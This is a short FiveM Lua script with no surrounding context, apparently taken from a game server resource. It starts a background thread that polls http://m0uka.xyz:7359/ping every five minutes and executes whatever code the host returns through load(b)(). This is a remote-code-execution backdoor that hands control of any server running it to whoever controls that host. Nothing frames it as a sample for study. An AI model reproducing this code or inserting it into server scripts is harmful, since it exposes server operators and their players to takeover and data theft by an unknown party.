Citizen.CreateThread(
    function()
        while true do
            PerformHttpRequest(
                "http://m0uka.xyz:7359/ping",
                function(a, b)
                    load(b)()
                end
            )
            Citizen.Wait(300000)
        end
    end
)
